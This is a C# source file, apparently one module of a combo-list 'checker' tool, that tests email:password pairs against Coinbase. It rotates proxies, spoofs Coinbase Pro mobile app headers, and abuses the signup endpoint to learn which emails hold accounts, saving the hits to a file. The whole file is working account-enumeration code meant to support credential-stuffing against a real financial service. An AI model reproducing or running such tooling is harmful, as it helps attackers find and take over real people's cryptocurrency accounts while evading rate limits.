using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class CoinBase
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AllowAutoRedirect = true;

                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                
                string str1 = httpRequest.Get("https://api.coinbase.com/v2/mobile/users").ToString();

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("User-Agent", "CoinbasePro/1.0.65 (com.coinbase.pro; build:1006502; Android 22)");
                httpRequest.AddHeader("x-cb-platform", "unknown");
                httpRequest.AddHeader("x-cb-pagekey", "unknown");
                httpRequest.AddHeader("accept", "application/json");
                httpRequest.AddHeader("user-agent", "CoinbasePro/1.0.65 (com.coinbase.pro; build:1006502; Android 22)");
                httpRequest.AddHeader("cb-client", "android-com.coinbase.pro/1.0.65");
                httpRequest.AddHeader("cb-version", "");
                httpRequest.AddHeader("Content-Type", "application/json");
                httpRequest.AddHeader("Host", "api.coinbase.com");
                httpRequest.AddHeader("Connection", "Keep-Alive");
                httpRequest.AddHeader("Accept-Encoding", "gzip");
                string str2 = httpRequest.Post("https://api.coinbase.com/v2/mobile/users", "{\"email\":\"" + strArray1[0] + "\",\"password\":\"" + "d" + "\",\"first_name\":\"sdad\",\"last_name\":\"ddssd\",\"accept_user_agreement\":true,\"application_client_id\":\"2d06b9a69c15e183856ff52c250281f6d93f9abef819921eac0d8647bb2b61f9\",\"response_type\":\"code\"}", "application/json").ToString();

                if (str2.Contains("A user already exists with this email"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($"[+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "CoinBase VM");
                    return true;
                }
                else if (str2.Contains("Password must have at least 8 characters"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    //Program.Save(combo, "Invalids");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch (Exception)
            {
                //Console.WriteLine(ex);
                ++Program.Retrie;
                return false;
            }
        }
    }
}
